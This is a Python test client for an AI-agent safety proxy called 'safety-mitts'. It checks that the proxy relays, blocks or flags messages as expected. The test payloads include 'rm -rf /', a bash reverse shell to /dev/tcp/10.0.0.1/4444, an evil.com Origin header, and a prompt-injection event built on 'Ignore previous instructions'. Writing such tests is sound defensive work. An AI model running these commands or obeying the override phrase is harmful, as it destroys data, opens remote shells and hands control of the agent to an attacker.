#!/usr/bin/env python3
"""Functional test client for safety-mitts.

Connects to the safety-mitts proxy on port 18789 and runs through a series
of test scenarios, verifying that messages are relayed, blocked, or flagged
as expected.
"""

import asyncio
import json
import sys
import time

import websockets

PROXY_URL = "ws://127.0.0.1:18789"

passed = 0
failed = 0


def report(name: str, ok: bool, detail: str = ""):
    global passed, failed
    status = "PASS" if ok else "FAIL"
    if ok:
        passed += 1
    else:
        failed += 1
    suffix = f"  ({detail})" if detail else ""
    print(f"  [{status}] {name}{suffix}", flush=True)


async def test_basic_connectivity():
    """Test 1: basic request/response relay."""
    try:
        async with websockets.connect(PROXY_URL) as ws:
            msg = {"type": "req", "id": "t1", "method": "system.info", "params": {}}
            await ws.send(json.dumps(msg))
            resp_raw = await asyncio.wait_for(ws.recv(), timeout=5)
            resp = json.loads(resp_raw)
            ok = resp.get("type") == "res" and resp.get("id") == "t1" and resp.get("ok") is True
            report("Basic connectivity", ok, f"got id={resp.get('id')}, ok={resp.get('ok')}")
    except Exception as e:
        report("Basic connectivity", False, str(e))


async def test_safe_command_passes():
    """Test 2: safe command passes through."""
    try:
        async with websockets.connect(PROXY_URL) as ws:
            msg = {
                "type": "req",
                "id": "t2",
                "method": "agent.execute",
                "params": {"command": "ls -la /tmp"},
            }
            await ws.send(json.dumps(msg))
            resp_raw = await asyncio.wait_for(ws.recv(), timeout=5)
            resp = json.loads(resp_raw)
            ok = resp.get("ok") is True and resp.get("id") == "t2"
            echoed = resp.get("result", {}).get("echoed_method", "")
            report("Safe command passes", ok, f"echoed_method={echoed}")
    except Exception as e:
        report("Safe command passes", False, str(e))


async def test_dangerous_command_blocked():
    """Test 3: rm -rf / is blocked by hard-gate rule."""
    try:
        async with websockets.connect(PROXY_URL) as ws:
            msg = {
                "type": "req",
                "id": "t3",
                "method": "agent.execute",
                "params": {"command": "rm -rf /"},
            }
            await ws.send(json.dumps(msg))
            # The proxy should block this message — the mock never receives it,
            # so we should NOT get a response. Wait briefly and check.
            try:
                resp_raw = await asyncio.wait_for(ws.recv(), timeout=2)
                # If we got a response, it means the message wasn't blocked.
                report("Dangerous command blocked", False, f"unexpected response: {resp_raw}")
            except asyncio.TimeoutError:
                # Timeout means the proxy blocked it and no response came back.
                report("Dangerous command blocked", True, "no response (blocked)")
    except Exception as e:
        report("Dangerous command blocked", False, str(e))


async def test_method_level_blocking():
    """Test 4: config.set is blocked at the method level."""
    try:
        async with websockets.connect(PROXY_URL) as ws:
            msg = {
                "type": "req",
                "id": "t4",
                "method": "config.set",
                "params": {"key": "tools.exec.host", "value": "gateway"},
            }
            await ws.send(json.dumps(msg))
            try:
                resp_raw = await asyncio.wait_for(ws.recv(), timeout=2)
                report("Method-level blocking", False, f"unexpected response: {resp_raw}")
            except asyncio.TimeoutError:
                report("Method-level blocking", True, "no response (blocked)")
    except Exception as e:
        report("Method-level blocking", False, str(e))


async def test_softgated_command_flagged():
    """Test 5: curl command is flagged (soft-gate) but still passes."""
    try:
        async with websockets.connect(PROXY_URL) as ws:
            msg = {
                "type": "req",
                "id": "t5",
                "method": "agent.execute",
                "params": {"command": "curl https://example.com"},
            }
            await ws.send(json.dumps(msg))
            resp_raw = await asyncio.wait_for(ws.recv(), timeout=5)
            resp = json.loads(resp_raw)
            # Should pass through (soft-gate allows), and mock echoes back.
            ok = resp.get("ok") is True and resp.get("id") == "t5"
            report("Soft-gated command flagged but passes", ok)
    except Exception as e:
        report("Soft-gated command flagged but passes", False, str(e))


async def test_prompt_injection_downstream():
    """Test 6: trigger injection event from mock, verify it passes (flag mode)."""
    try:
        async with websockets.connect(PROXY_URL) as ws:
            # Ask the mock to send an injection event.
            msg = {
                "type": "req",
                "id": "t6",
                "method": "trigger_injection",
                "params": {},
            }
            await ws.send(json.dumps(msg))
            # We should receive the event first, then the response.
            messages = []
            for _ in range(2):
                raw = await asyncio.wait_for(ws.recv(), timeout=5)
                messages.append(json.loads(raw))

            # Check we got the event with injection text (flag mode passes it).
            events = [m for m in messages if m.get("type") == "event"]
            responses = [m for m in messages if m.get("type") == "res"]

            event_ok = len(events) == 1 and "Ignore previous instructions" in json.dumps(events[0])
            resp_ok = len(responses) == 1 and responses[0].get("ok") is True

            report("Prompt injection detected (downstream)", event_ok and resp_ok,
                   f"event_received={len(events)}, injection_text_present={event_ok}")
    except Exception as e:
        report("Prompt injection detected (downstream)", False, str(e))


async def test_non_json_passthrough():
    """Test 7: non-JSON text messages pass through unchanged."""
    try:
        async with websockets.connect(PROXY_URL) as ws:
            plain = "hello this is not json"
            await ws.send(plain)
            resp = await asyncio.wait_for(ws.recv(), timeout=5)
            ok = resp == plain
            report("Non-JSON passthrough", ok, f"echoed={resp!r}")
    except Exception as e:
        report("Non-JSON passthrough", False, str(e))


async def test_reverse_shell_blocked():
    """Test 8: reverse shell pattern is blocked."""
    try:
        async with websockets.connect(PROXY_URL) as ws:
            msg = {
                "type": "req",
                "id": "t8",
                "method": "agent.execute",
                "params": {"command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
            }
            await ws.send(json.dumps(msg))
            try:
                resp_raw = await asyncio.wait_for(ws.recv(), timeout=2)
                report("Reverse shell blocked", False, f"unexpected response: {resp_raw}")
            except asyncio.TimeoutError:
                report("Reverse shell blocked", True, "no response (blocked)")
    except Exception as e:
        report("Reverse shell blocked", False, str(e))


async def test_origin_rejection():
    """Test 9: connection with evil origin is rejected."""
    try:
        extra_headers = {"Origin": "https://evil.com"}
        async with websockets.connect(PROXY_URL, additional_headers=extra_headers) as ws:
            await ws.send("hello")
            report("Origin rejection", False, "connection was not rejected")
    except (websockets.exceptions.InvalidStatusCode,
            websockets.exceptions.InvalidHandshake,
            ConnectionRefusedError,
            Exception) as e:
        # Any connection failure is expected.
        report("Origin rejection", True, f"rejected: {type(e).__name__}")


async def main():
    print("\n=== Safety-Mitts Functional Tests ===\n", flush=True)

    # Run tests sequentially to keep output clear.
    await test_basic_connectivity()
    await test_safe_command_passes()
    await test_dangerous_command_blocked()
    await test_method_level_blocking()
    await test_softgated_command_flagged()
    await test_prompt_injection_downstream()
    await test_non_json_passthrough()
    await test_reverse_shell_blocked()
    await test_origin_rejection()

    print(f"\n=== Results: {passed} passed, {failed} failed ===\n", flush=True)
    sys.exit(0 if failed == 0 else 1)


if __name__ == "__main__":
    asyncio.run(main())
